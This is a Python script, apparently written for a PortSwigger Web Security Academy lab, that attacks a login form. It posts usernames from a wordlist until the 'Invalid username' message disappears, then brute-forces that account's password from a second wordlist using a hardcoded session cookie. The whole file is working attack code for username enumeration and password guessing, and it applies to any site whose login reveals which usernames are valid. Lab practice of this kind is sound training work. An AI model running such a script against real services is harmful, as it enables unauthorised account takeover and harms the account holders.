import requests

domain = "0a8f00b2047285af8137df0d006a003b.web-security-academy.net" #Make sure not to include the protocol and endpoint here
base_url = f"https://{domain}"
login_url = f"{base_url}/login"
session_token = "Y7TMiNkHA9HfHzdRW5as2qPcpQlS7jfI"
cookie_header = f"session={session_token}"

headers = {
    'Host': domain,
    'Cookie': cookie_header,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Origin': base_url,
    'Referer': login_url,
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
}

with open("usernames", "r") as users:
    for user in users:
        username=user.strip()
        payload = {'username': username, 'password':'admin'}
        r = requests.post(login_url, data=payload, headers=headers)
        
        print(username + " : ", end='')

        text = "Invalid username"
        if (text in r.text):
            print(text)
        else:
            valid_username = username
            print(f'[+] Valid username found: ', valid_username)
            break

with open("passwords", "r") as passwords:
    for password in passwords:
        password=password.strip()
        payload = {'username': valid_username, 'password': password}
        r = requests.post(login_url, data=payload, headers=headers)
        text = "Incorrect password"
        print(password + " : ", end='')
        if (text in r.text):
            print("Incorrect Password")
        else:
            valid_password = password
            print(f"[+] Password found: ", valid_password)
            break
            
print("-------------------------------------")
print("Username : ", valid_username)
print("Password : ", valid_password)
